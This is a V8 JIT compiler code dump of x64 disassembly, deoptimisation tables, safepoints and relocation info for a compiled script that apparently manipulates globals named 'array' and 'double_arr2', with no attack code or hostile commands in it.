                  ;;; <@590,#440> -------------------- B24 (unreachable/replaced) --------------------
                  ;;; <@618,#457> -------------------- B25 (unreachable/replaced) --------------------
                  ;;; <@24,#18> -------------------- Deferred allocate --------------------
0x26c10af0b91e  3582  33db           xorl rbx,rbx
0x26c10af0b920  3584  50             push rax
0x26c10af0b921  3585  51             push rcx
0x26c10af0b922  3586  52             push rdx
0x26c10af0b923  3587  53             push rbx
0x26c10af0b924  3588  56             push rsi
0x26c10af0b925  3589  57             push rdi
0x26c10af0b926  3590  4150           push r8
0x26c10af0b928  3592  4151           push r9
0x26c10af0b92a  3594  4153           push r11
0x26c10af0b92c  3596  4154           push r12
0x26c10af0b92e  3598  4156           push r14
0x26c10af0b930  3600  4157           push r15
0x26c10af0b932  3602  488d6424e0     REX.W leaq rsp,[rsp-0x20]
0x26c10af0b937  3607  6a00           push 0x0
0x26c10af0b939  3609  c6442404e8     movb [rsp+0x4],0xe8
0x26c10af0b93e  3614  6a00           push 0x0
0x26c10af0b940  3616  488b75e0       REX.W movq rsi,[rbp-0x20]
0x26c10af0b944  3620  b802000000     movl rax,0x2
0x26c10af0b949  3625  48bb809b72cad27f0000 REX.W movq rbx,0x7fd2ca729b80    ;; external reference (Runtime::AllocateInTargetSpace)
0x26c10af0b953  3635  e8e8a6dfff     call 0x26c10ad06040     ;; code: STUB, CEntryStub, minor: 9
0x26c10af0b958  3640  4889442460     REX.W movq [rsp+0x60],rax
0x26c10af0b95d  3645  4883e801       REX.W subq rax,0x1
0x26c10af0b961  3649  49898568fc0300 REX.W movq [r13+0x3fc68],rax
0x26c10af0b968  3656  4883c001       REX.W addq rax,0x1
0x26c10af0b96c  3660  488d642420     REX.W leaq rsp,[rsp+0x20]
0x26c10af0b971  3665  415f           pop r15
0x26c10af0b973  3667  415e           pop r14
0x26c10af0b975  3669  415c           pop r12
0x26c10af0b977  3671  415b           pop r11
0x26c10af0b979  3673  4159           pop r9
0x26c10af0b97b  3675  4158           pop r8
0x26c10af0b97d  3677  5f             pop rdi
0x26c10af0b97e  3678  5e             pop rsi
0x26c10af0b97f  3679  5b             pop rbx
0x26c10af0b980  3680  5a             pop rdx
0x26c10af0b981  3681  59             pop rcx
0x26c10af0b982  3682  58             pop rax
0x26c10af0b983  3683  e92ff2ffff     jmp 151  (0x26c10af0abb7)
                  ;;; <@126,#105> -------------------- Deferred allocate --------------------
0x26c10af0b988  3688  33db           xorl rbx,rbx
0x26c10af0b98a  3690  50             push rax
0x26c10af0b98b  3691  51             push rcx
0x26c10af0b98c  3692  52             push rdx
0x26c10af0b98d  3693  53             push rbx
0x26c10af0b98e  3694  56             push rsi
0x26c10af0b98f  3695  57             push rdi
0x26c10af0b990  3696  4150           push r8
0x26c10af0b992  3698  4151           push r9
0x26c10af0b994  3700  4153           push r11
0x26c10af0b996  3702  4154           push r12
0x26c10af0b998  3704  4156           push r14
0x26c10af0b99a  3706  4157           push r15
0x26c10af0b99c  3708  488d6424e0     REX.W leaq rsp,[rsp-0x20]
0x26c10af0b9a1  3713  6a00           push 0x0
0x26c10af0b9a3  3715  c644240440     movb [rsp+0x4],0x40
0x26c10af0b9a8  3720  6a00           push 0x0
0x26c10af0b9aa  3722  488b75e0       REX.W movq rsi,[rbp-0x20]
0x26c10af0b9ae  3726  b802000000     movl rax,0x2
0x26c10af0b9b3  3731  48bb809b72cad27f0000 REX.W movq rbx,0x7fd2ca729b80    ;; external reference (Runtime::AllocateInTargetSpace)
0x26c10af0b9bd  3741  e87ea6dfff     call 0x26c10ad06040     ;; code: STUB, CEntryStub, minor: 9
0x26c10af0b9c2  3746  4889442460     REX.W movq [rsp+0x60],rax
0x26c10af0b9c7  3751  4883e801       REX.W subq rax,0x1
0x26c10af0b9cb  3755  49898568fc0300 REX.W movq [r13+0x3fc68],rax
0x26c10af0b9d2  3762  4883c001       REX.W addq rax,0x1
0x26c10af0b9d6  3766  488d642420     REX.W leaq rsp,[rsp+0x20]
0x26c10af0b9db  3771  415f           pop r15
0x26c10af0b9dd  3773  415e           pop r14
0x26c10af0b9df  3775  415c           pop r12
0x26c10af0b9e1  3777  415b           pop r11
0x26c10af0b9e3  3779  4159           pop r9
0x26c10af0b9e5  3781  4158           pop r8
0x26c10af0b9e7  3783  5f             pop rdi
0x26c10af0b9e8  3784  5e             pop rsi
0x26c10af0b9e9  3785  5b             pop rbx
0x26c10af0b9ea  3786  5a             pop rdx
0x26c10af0b9eb  3787  59             pop rcx
0x26c10af0b9ec  3788  58             pop rax
0x26c10af0b9ed  3789  e9b4f7ffff     jmp 1670  (0x26c10af0b1a6)
                  ;;; <@284,#241> -------------------- Deferred stack-check --------------------
0x26c10af0b9f2  3794  50             push rax
0x26c10af0b9f3  3795  51             push rcx
0x26c10af0b9f4  3796  52             push rdx
0x26c10af0b9f5  3797  53             push rbx
0x26c10af0b9f6  3798  56             push rsi
0x26c10af0b9f7  3799  57             push rdi
0x26c10af0b9f8  3800  4150           push r8
0x26c10af0b9fa  3802  4151           push r9
0x26c10af0b9fc  3804  4153           push r11
0x26c10af0b9fe  3806  4154           push r12
0x26c10af0ba00  3808  4156           push r14
0x26c10af0ba02  3810  4157           push r15
0x26c10af0ba04  3812  488d6424e0     REX.W leaq rsp,[rsp-0x20]
0x26c10af0ba09  3817  488b75f8       REX.W movq rsi,[rbp-0x8]
0x26c10af0ba0d  3821  33c0           xorl rax,rax
0x26c10af0ba0f  3823  48bb309072cad27f0000 REX.W movq rbx,0x7fd2ca729030    ;; external reference (Runtime::StackGuard)
0x26c10af0ba19  3833  e822a6dfff     call 0x26c10ad06040     ;; code: STUB, CEntryStub, minor: 9
0x26c10af0ba1e  3838  488d642420     REX.W leaq rsp,[rsp+0x20]
0x26c10af0ba23  3843  415f           pop r15
0x26c10af0ba25  3845  415e           pop r14
0x26c10af0ba27  3847  415c           pop r12
0x26c10af0ba29  3849  415b           pop r11
0x26c10af0ba2b  3851  4159           pop r9
0x26c10af0ba2d  3853  4158           pop r8
0x26c10af0ba2f  3855  5f             pop rdi
0x26c10af0ba30  3856  5e             pop rsi
0x26c10af0ba31  3857  5b             pop rbx
0x26c10af0ba32  3858  5a             pop rdx
0x26c10af0ba33  3859  59             pop rcx
0x26c10af0ba34  3860  58             pop rax
0x26c10af0ba35  3861  e902fbffff     jmp 2588  (0x26c10af0b53c)
                  ;;; <@294,#253> -------------------- Deferred allocate --------------------
0x26c10af0ba3a  3866  33c9           xorl rcx,rcx
0x26c10af0ba3c  3868  50             push rax
0x26c10af0ba3d  3869  51             push rcx
0x26c10af0ba3e  3870  52             push rdx
0x26c10af0ba3f  3871  53             push rbx
0x26c10af0ba40  3872  56             push rsi
0x26c10af0ba41  3873  57             push rdi
0x26c10af0ba42  3874  4150           push r8
0x26c10af0ba44  3876  4151           push r9
0x26c10af0ba46  3878  4153           push r11
0x26c10af0ba48  3880  4154           push r12
0x26c10af0ba4a  3882  4156           push r14
0x26c10af0ba4c  3884  4157           push r15
0x26c10af0ba4e  3886  488d6424e0     REX.W leaq rsp,[rsp-0x20]
0x26c10af0ba53  3891  6a00           push 0x0
0x26c10af0ba55  3893  c644240438     movb [rsp+0x4],0x38
0x26c10af0ba5a  3898  6a00           push 0x0
0x26c10af0ba5c  3900  48bec13c2071ce040000 REX.W movq rsi,0x4ce71203cc1    ;; object: 0x4ce71203cc1 <FixedArray[251]>
0x26c10af0ba66  3910  b802000000     movl rax,0x2
0x26c10af0ba6b  3915  48bb809b72cad27f0000 REX.W movq rbx,0x7fd2ca729b80    ;; external reference (Runtime::AllocateInTargetSpace)
0x26c10af0ba75  3925  e8c6a5dfff     call 0x26c10ad06040     ;; code: STUB, CEntryStub, minor: 9
0x26c10af0ba7a  3930  4889442470     REX.W movq [rsp+0x70],rax
0x26c10af0ba7f  3935  488d642420     REX.W leaq rsp,[rsp+0x20]
0x26c10af0ba84  3940  415f           pop r15
0x26c10af0ba86  3942  415e           pop r14
0x26c10af0ba88  3944  415c           pop r12
0x26c10af0ba8a  3946  415b           pop r11
0x26c10af0ba8c  3948  4159           pop r9
0x26c10af0ba8e  3950  4158           pop r8
0x26c10af0ba90  3952  5f             pop rdi
0x26c10af0ba91  3953  5e             pop rsi
0x26c10af0ba92  3954  5b             pop rbx
0x26c10af0ba93  3955  5a             pop rdx
0x26c10af0ba94  3956  59             pop rcx
0x26c10af0ba95  3957  58             pop rax
0x26c10af0ba96  3958  e9f9faffff     jmp 2676  (0x26c10af0b594)
                  ;;; -------------------- Jump table --------------------
0x26c10af0ba9b  3963  e8b085c7ff     call 0x26c10ab84050     ;; deoptimization bailout 8
0x26c10af0baa0  3968  e8b585c7ff     call 0x26c10ab8405a     ;; deoptimization bailout 9
0x26c10af0baa5  3973  e8ba85c7ff     call 0x26c10ab84064     ;; deoptimization bailout 10
0x26c10af0baaa  3978  e8c985c7ff     call 0x26c10ab84078     ;; deoptimization bailout 12
0x26c10af0baaf  3983  e8ce85c7ff     call 0x26c10ab84082     ;; deoptimization bailout 13
0x26c10af0bab4  3988  e8dd85c7ff     call 0x26c10ab84096     ;; deoptimization bailout 15
0x26c10af0bab9  3993  e8e285c7ff     call 0x26c10ab840a0     ;; deoptimization bailout 16
0x26c10af0babe  3998  e8e785c7ff     call 0x26c10ab840aa     ;; deoptimization bailout 17
0x26c10af0bac3  4003  e8ec85c7ff     call 0x26c10ab840b4     ;; deoptimization bailout 18
0x26c10af0bac8  4008  e8f185c7ff     call 0x26c10ab840be     ;; deoptimization bailout 19
0x26c10af0bacd  4013  0f1f00         nop
                  ;;; Safepoint table.

Source positions:
 pc offset  position
      2254       658
      2254       658
      2254       658
      2254       658
      2254       658
      2269       658
      2274       351
      2289       351
      2294       794
      2294       794
      2294       794
      2304       794
      2304       794
      2333       794
      2333       794
      2333       794
      2345       794
      2345       794
      2345       658
      2357       658
      2357       816
      2367       816
      2367       658
      2377       658
      2377       658
      2390       658
      2390       658
      2390       658
      2390       658
      2400       658
      2400       658
      2420       658
      2420       658
      2430       658
      2430       658
      2434       658
      2434       658
      2444       658
      2444       658
      2473       658
      2473       658
      2482       658
      2487       658
      2492       658
      2492       694
      2494       694
      2494       334
      2498       334
      2498       334
      2508       334
      2508       334
      2528       334
      2528       334
      2538       334
      2538       334
      2567       334
      2567       334
      2567       334
      2575       334
      2575       334
      2575       334
      2588       334
      2588       334
      2598       334
      2598       334
      2602       334
      2602       334
      2610       334
      2610       334
      2615       334
      2619       334
      2676       334
      2680       334
      2715       334
      2715       334
      2750       334
      2750       334
      2785       334
      2785       334
      2820       334
      2820       334
      2855       334
      2855       334
      2890       334
      2890       334
      2925       334
      2925       334
      2960       334
      2960       334
      2995       334
      2995       334
      3030       334
      3030       334
      3065       334
      3065       334
      3074       334
      3074       816
      3084       816
      3087       334
      3168       334
      3168       334
      3168       334
      3172       334
      3192       334
      3192       334
      3196       334
      3196       334
      3216       334
      3216       334
      3245       334
      3245       334
      3254       334
      3254       658
      3256       658
      3266       334
      3356       334
      3360       351
      3363       351
      3363       351
      3368       351
      3373       351
      3373       351
      3373       658
      3383       658
      3383       351
      3387       351
      3387       658
      3397       658
      3397       351
      3426       351
      3426       351
      3435       351
      3440       351
      3445       351
      3445       351
      3445       351
      3445       806
      3445       806
      3445       794
      3455       794
      3455       806
      3484       806
      3484       806
      3493       806
      3493       806
      3499       806
      3499       794
      3509       794
      3509       806
      3555       806
      3555       806
      3572       806
      3577       806
      3577       806
      3577       806
      3577       806
      3794       334
      3866       334

Inlined functions (count = 2)
 0x4ce71231429 <SharedFunctionInfo f>
 0x4ce71231279 <SharedFunctionInfo transition>

Deoptimization Input Data (deopt points = 21)
 index  ast id    argc     pc
     0       4       0     92
     1       4       0    119
     2      38       0   1619
     3      69       0   2089
     4      92       0   2129
     5     107       0   2179
     6     121       0     -1
     7       5       0   2390
     8       5       0     -1
     9       5       0     -1
    10      11       0     -1
    11      15       0   2588
    12      15       0     -1
    13      15       0     -1
    14      15       0   3168
    15      15       0     -1
    16      15       0     -1
    17      15       0     -1
    18      28       0     -1
    19     158       0     -1
    20     120       0     -1

Safepoints (size = 152)
0x26c10af0ab7c    92  0000000100000 (sp -> fp)       0
0x26c10af0ab97   119  0000000100000 (sp -> fp)       1
0x26c10af0b173  1619  0000000100000 (sp -> fp)       2
0x26c10af0b349  2089  0000000100000 (sp -> fp)       3
0x26c10af0b371  2129  0000000100000 (sp -> fp)       4
0x26c10af0b3a3  2179  0000000100000 (sp -> fp)       5
0x26c10af0b476  2390  0000011000000 (sp -> fp)       7
0x26c10af0b769  3145  0011011000000 | rax | rsi (sp -> fp)      14
0x26c10af0b958  3640  0000000100000 | rbx (sp -> fp)  <none> argc: 2
0x26c10af0b9c2  3746  0000000100000 | rbx (sp -> fp)  <none> argc: 2
0x26c10af0ba1e  3838  0000011000000 (sp -> fp)      11
0x26c10af0ba7a  3930  0001011000000 | rcx | rdx (sp -> fp)  <none> argc: 2

RelocInfo (size = 3815)
0x26c10af0ab43  comment  (;;; <@0,#0> -------------------- B0 --------------------)
0x26c10af0ab43  comment  (;;; <@4,#3> prologue)
0x26c10af0ab43  comment  (;;; Prologue begin)
0x26c10af0ab43  comment  (;;; Prologue end)
0x26c10af0ab43  comment  (;;; <@8,#5> -------------------- B1 --------------------)
0x26c10af0ab43  comment  (;;; <@10,#6> context)
0x26c10af0ab47  comment  (;;; <@11,#6> gap)
0x26c10af0ab4b  comment  (;;; <@14,#10> -------------------- B2 --------------------)
0x26c10af0ab4b  comment  (;;; <@15,#10> gap)
0x26c10af0ab4e  comment  (;;; <@16,#11> declare-globals)
0x26c10af0ab50  embedded object  (0x4ce7123eac9 <FixedArray[32]>)
0x26c10af0ab5e  embedded object  (0x4ce71232199 <FixedArray[44]>)
0x26c10af0ab6f  external reference (Runtime::DeclareGlobals)  (0x7fd2ca76de40)
0x26c10af0ab78  code target (STUB)  (0x26c10ad041a0)
0x26c10af0ab7c  comment  (;;; <@18,#12> lazy-bailout)
0x26c10af0ab7c  comment  (;;; <@19,#12> gap)
0x26c10af0ab80  comment  (;;; <@20,#13> stack-check)
0x26c10af0ab93  code target (BUILTIN)  (0x26c10ade9300)
0x26c10af0ab97  comment  (;;; <@22,#13> lazy-bailout)
0x26c10af0ab97  comment  (;;; <@24,#18> allocate)
0x26c10af0abb7  comment  (;;; <@26,#503> fast-allocate)
0x26c10af0abc6  comment  (Abort message: )
0x26c10af0abc6  comment  (Unaligned allocation in new space)
0x26c10af0abd1  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0abe1  comment  (;;; <@28,#20> store-named-field)
0x26c10af0abe6  comment  (Abort message: )
0x26c10af0abe6  comment  (Operand is a smi)
0x26c10af0abf1  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0abf8  embedded object  (0x139738b02241 <FixedArray[0]>)
0x26c10af0ac04  comment  (;;; <@30,#22> store-named-field)
0x26c10af0ac09  comment  (Abort message: )
0x26c10af0ac09  comment  (Operand is a smi)
0x26c10af0ac14  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0ac1b  embedded object  (0x22ab7cc83a69 <Map(FAST_ELEMENTS)>)
0x26c10af0ac27  comment  (;;; <@32,#24> store-named-field)
0x26c10af0ac2c  comment  (Abort message: )
0x26c10af0ac2c  comment  (Operand is a smi)
0x26c10af0ac37  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0ac3e  embedded object  (0x139738b02241 <FixedArray[0]>)
0x26c10af0ac4a  comment  (;;; <@34,#26> store-named-field)
0x26c10af0ac4f  comment  (Abort message: )
0x26c10af0ac4f  comment  (Operand is a smi)
0x26c10af0ac5a  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0ac6d  comment  (;;; <@36,#28> fast-allocate)
0x26c10af0ac7c  comment  (Abort message: )
0x26c10af0ac7c  comment  (Unaligned allocation in new space)
0x26c10af0ac87  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0ac97  comment  (;;; <@38,#31> store-named-field)
0x26c10af0ac9c  comment  (Abort message: )
0x26c10af0ac9c  comment  (Operand is a smi)
0x26c10af0aca7  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0acae  embedded object  (0x1c2166f82309 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af0acba  comment  (;;; <@40,#32> store-named-field)
0x26c10af0acbf  comment  (Abort message: )
0x26c10af0acbf  comment  (Operand is a smi)
0x26c10af0acca  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0acdd  comment  (;;; <@42,#36> fast-allocate)
0x26c10af0acec  comment  (Abort message: )
0x26c10af0acec  comment  (Unaligned allocation in new space)
0x26c10af0acf7  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0ad07  comment  (;;; <@44,#38> store-named-field)
0x26c10af0ad0c  comment  (Abort message: )
0x26c10af0ad0c  comment  (Operand is a smi)
0x26c10af0ad17  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0ad1e  embedded object  (0x139738b02241 <FixedArray[0]>)
0x26c10af0ad2a  comment  (;;; <@46,#40> store-named-field)
0x26c10af0ad2f  comment  (Abort message: )
0x26c10af0ad2f  comment  (Operand is a smi)
0x26c10af0ad3a  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0ad41  embedded object  (0x22ab7cc83a69 <Map(FAST_ELEMENTS)>)
0x26c10af0ad4d  comment  (;;; <@48,#42> store-named-field)
0x26c10af0ad52  comment  (Abort message: )
0x26c10af0ad52  comment  (Operand is a smi)
0x26c10af0ad5d  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0ad64  embedded object  (0x139738b02241 <FixedArray[0]>)
0x26c10af0ad70  comment  (;;; <@50,#44> store-named-field)
0x26c10af0ad75  comment  (Abort message: )
0x26c10af0ad75  comment  (Operand is a smi)
0x26c10af0ad80  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0ad93  comment  (;;; <@52,#46> fast-allocate)
0x26c10af0ada2  comment  (Abort message: )
0x26c10af0ada2  comment  (Unaligned allocation in new space)
0x26c10af0adad  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0adbd  comment  (;;; <@54,#49> store-named-field)
0x26c10af0adc3  comment  (Abort message: )
0x26c10af0adc3  comment  (Operand is a smi)
0x26c10af0adce  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0add5  embedded object  (0x1c2166f82309 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af0ade1  comment  (;;; <@56,#50> store-named-field)
0x26c10af0ade7  comment  (Abort message: )
0x26c10af0ade7  comment  (Operand is a smi)
0x26c10af0adf2  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0ae05  comment  (;;; <@58,#54> fast-allocate)
0x26c10af0ae14  comment  (Abort message: )
0x26c10af0ae14  comment  (Unaligned allocation in new space)
0x26c10af0ae1f  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0ae2f  comment  (;;; <@60,#56> store-named-field)
0x26c10af0ae35  comment  (Abort message: )
0x26c10af0ae35  comment  (Operand is a smi)
0x26c10af0ae40  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0ae47  embedded object  (0x139738b02241 <FixedArray[0]>)
0x26c10af0ae53  comment  (;;; <@62,#58> store-named-field)
0x26c10af0ae59  comment  (Abort message: )
0x26c10af0ae59  comment  (Operand is a smi)
0x26c10af0ae64  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0ae6b  embedded object  (0x22ab7cc831d1 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af0ae77  comment  (;;; <@64,#60> store-named-field)
0x26c10af0ae7d  comment  (Abort message: )
0x26c10af0ae7d  comment  (Operand is a smi)
0x26c10af0ae88  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0ae8f  embedded object  (0x139738b02241 <FixedArray[0]>)
0x26c10af0ae9b  comment  (;;; <@66,#61> store-named-field)
0x26c10af0aea1  comment  (Abort message: )
0x26c10af0aea1  comment  (Operand is a smi)
0x26c10af0aeac  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0aeb3  embedded object  (0x139738b02311 <undefined>)
0x26c10af0aebf  comment  (;;; <@68,#62> store-named-field)
0x26c10af0aec5  comment  (Abort message: )
0x26c10af0aec5  comment  (Operand is a smi)
0x26c10af0aed0  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0aed7  embedded object  (0x139738b02311 <undefined>)
0x26c10af0aee3  comment  (;;; <@70,#63> store-named-field)
0x26c10af0aee9  comment  (Abort message: )
0x26c10af0aee9  comment  (Operand is a smi)
0x26c10af0aef4  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0aefb  embedded object  (0x139738b02311 <undefined>)
0x26c10af0af07  comment  (;;; <@72,#64> store-named-field)
0x26c10af0af0d  comment  (Abort message: )
0x26c10af0af0d  comment  (Operand is a smi)
0x26c10af0af18  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0af1f  embedded object  (0x139738b02311 <undefined>)
0x26c10af0af2b  comment  (;;; <@74,#68> store-named-field)
0x26c10af0af31  comment  (Abort message: )
0x26c10af0af31  comment  (Operand is a smi)
0x26c10af0af3c  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0af43  embedded object  (0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af0af4f  comment  (;;; <@76,#69> store-named-field)
0x26c10af0af55  comment  (Abort message: )
0x26c10af0af55  comment  (Operand is a smi)
0x26c10af0af60  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0af67  embedded object  (0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af0af73  comment  (;;; <@78,#70> store-named-field)
0x26c10af0af79  comment  (Abort message: )
0x26c10af0af79  comment  (Operand is a smi)
0x26c10af0af84  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0af8b  embedded object  (0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af0af97  comment  (;;; <@80,#71> store-named-field)
0x26c10af0af9d  comment  (Abort message: )
0x26c10af0af9d  comment  (Operand is a smi)
0x26c10af0afa8  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0afaf  embedded object  (0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af0afbb  comment  (;;; <@82,#72> store-keyed)
0x26c10af0afbf  comment  (;;; <@84,#73> store-named-field)
0x26c10af0afc4  comment  (Abort message: )
0x26c10af0afc4  comment  (Operand is a smi)
0x26c10af0afcf  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0afd8  comment  (;;; <@86,#74> store-keyed)
0x26c10af0afdc  comment  (;;; <@88,#77> fast-allocate)
0x26c10af0afeb  comment  (Abort message: )
0x26c10af0afeb  comment  (Unaligned allocation in new space)
0x26c10af0aff6  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b006  comment  (;;; <@90,#79> store-named-field)
0x26c10af0b00b  comment  (Abort message: )
0x26c10af0b00b  comment  (Operand is a smi)
0x26c10af0b016  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b01d  embedded object  (0x139738b02241 <FixedArray[0]>)
0x26c10af0b029  comment  (;;; <@92,#81> store-named-field)
0x26c10af0b02e  comment  (Abort message: )
0x26c10af0b02e  comment  (Operand is a smi)
0x26c10af0b039  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b040  embedded object  (0x22ab7cc83a69 <Map(FAST_ELEMENTS)>)
0x26c10af0b04c  comment  (;;; <@94,#83> store-named-field)
0x26c10af0b051  comment  (Abort message: )
0x26c10af0b051  comment  (Operand is a smi)
0x26c10af0b05c  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b063  embedded object  (0x139738b02241 <FixedArray[0]>)
0x26c10af0b06f  comment  (;;; <@96,#85> store-named-field)
0x26c10af0b074  comment  (Abort message: )
0x26c10af0b074  comment  (Operand is a smi)
0x26c10af0b07f  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b092  comment  (;;; <@98,#87> fast-allocate)
0x26c10af0b0a1  comment  (Abort message: )
0x26c10af0b0a1  comment  (Unaligned allocation in new space)
0x26c10af0b0ac  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b0bc  comment  (;;; <@100,#90> store-named-field)
0x26c10af0b0c2  comment  (Abort message: )
0x26c10af0b0c2  comment  (Operand is a smi)
0x26c10af0b0cd  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b0d4  embedded object  (0x1c2166f82309 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af0b0e0  comment  (;;; <@102,#91> store-named-field)
0x26c10af0b0e6  comment  (Abort message: )
0x26c10af0b0e6  comment  (Operand is a smi)
0x26c10af0b0f1  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b104  comment  (;;; <@104,#92> constant-t)
0x26c10af0b106  embedded object  (0x4ce7123a509 <FixedArray[1]>)
0x26c10af0b10e  comment  (;;; <@106,#94> load-keyed)
0x26c10af0b112  comment  (;;; <@108,#95> store-keyed)
0x26c10af0b116  comment  (;;; <@110,#96> store-named-field)
0x26c10af0b11b  comment  (Abort message: )
0x26c10af0b11b  comment  (Operand is a smi)
0x26c10af0b126  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b12f  comment  (;;; <@112,#97> store-keyed)
0x26c10af0b133  comment  (;;; <@114,#98> store-named-field)
0x26c10af0b138  comment  (Abort message: )
0x26c10af0b138  comment  (Operand is a smi)
0x26c10af0b143  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b14c  comment  (;;; <@116,#99> push-argument)
0x26c10af0b14e  embedded object  (0x4ce71231041 <String[5]: array>)
0x26c10af0b158  comment  (;;; <@118,#99> push-argument)
0x26c10af0b15a  comment  (;;; <@120,#99> push-argument)
0x26c10af0b15b  comment  (;;; <@121,#99> gap)
0x26c10af0b15f  comment  (;;; <@122,#100> call-runtime)
0x26c10af0b166  external reference (Runtime::InitializeVarGlobal)  (0x7fd2ca76e720)
0x26c10af0b16f  code target (STUB)  (0x26c10ad041a0)
0x26c10af0b173  comment  (;;; <@124,#101> lazy-bailout)
0x26c10af0b173  comment  (;;; <@126,#105> allocate)
0x26c10af0b17f  comment  (Abort message: )
0x26c10af0b17f  comment  (Allocation is not double aligned)
0x26c10af0b18a  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b1a6  comment  (;;; <@128,#510> fast-allocate)
0x26c10af0b1b5  comment  (Abort message: )
0x26c10af0b1b5  comment  (Unaligned allocation in new space)
0x26c10af0b1c0  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b1d0  comment  (;;; <@130,#107> store-named-field)
0x26c10af0b1d5  comment  (Abort message: )
0x26c10af0b1d5  comment  (Operand is a smi)
0x26c10af0b1e0  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b1e7  embedded object  (0x139738b02241 <FixedArray[0]>)
0x26c10af0b1f3  comment  (;;; <@132,#109> store-named-field)
0x26c10af0b1f8  comment  (Abort message: )
0x26c10af0b1f8  comment  (Operand is a smi)
0x26c10af0b203  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b20a  embedded object  (0x22ab7cc83c79 <Map(FAST_DOUBLE_ELEMENTS)>)
0x26c10af0b216  comment  (;;; <@134,#111> store-named-field)
0x26c10af0b21b  comment  (Abort message: )
0x26c10af0b21b  comment  (Operand is a smi)
0x26c10af0b226  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b22d  embedded object  (0x139738b02241 <FixedArray[0]>)
0x26c10af0b239  comment  (;;; <@136,#113> store-named-field)
0x26c10af0b23e  comment  (Abort message: )
0x26c10af0b23e  comment  (Operand is a smi)
0x26c10af0b249  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b25c  comment  (;;; <@138,#115> fast-allocate)
0x26c10af0b268  comment  (Abort message: )
0x26c10af0b268  comment  (Allocation is not double aligned)
0x26c10af0b273  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b280  comment  (Abort message: )
0x26c10af0b280  comment  (Unaligned allocation in new space)
0x26c10af0b28b  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b29b  comment  (;;; <@140,#118> store-named-field)
0x26c10af0b2a0  comment  (Abort message: )
0x26c10af0b2a0  comment  (Operand is a smi)
0x26c10af0b2ab  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b2b2  embedded object  (0x1c2166f82e09 <Map(FAST_HOLEY_DOUBLE_ELEMENTS)>)
0x26c10af0b2be  comment  (;;; <@142,#119> store-named-field)
0x26c10af0b2c3  comment  (Abort message: )
0x26c10af0b2c3  comment  (Operand is a smi)
0x26c10af0b2ce  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b2e1  comment  (;;; <@144,#120> constant-t)
0x26c10af0b2e3  embedded object  (0x4ce7123a521 <FixedDoubleArray[2]>)
0x26c10af0b2eb  comment  (;;; <@146,#122> load-keyed)
0x26c10af0b2f0  comment  (;;; <@148,#123> store-keyed)
0x26c10af0b2f5  comment  (;;; <@150,#120> constant-t)
0x26c10af0b2f7  embedded object  (0x4ce7123a521 <FixedDoubleArray[2]>)
0x26c10af0b2ff  comment  (;;; <@152,#125> load-keyed)
0x26c10af0b304  comment  (;;; <@154,#126> store-keyed)
0x26c10af0b309  comment  (;;; <@156,#127> store-named-field)
0x26c10af0b30e  comment  (Abort message: )
0x26c10af0b30e  comment  (Operand is a smi)
0x26c10af0b319  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0b322  comment  (;;; <@158,#128> push-argument)
0x26c10af0b324  embedded object  (0x4ce71231089 <String[11]: double_arr2>)
0x26c10af0b32e  comment  (;;; <@160,#128> push-argument)
0x26c10af0b330  comment  (;;; <@162,#128> push-argument)
0x26c10af0b331  comment  (;;; <@163,#128> gap)
0x26c10af0b335  comment  (;;; <@164,#129> call-runtime)
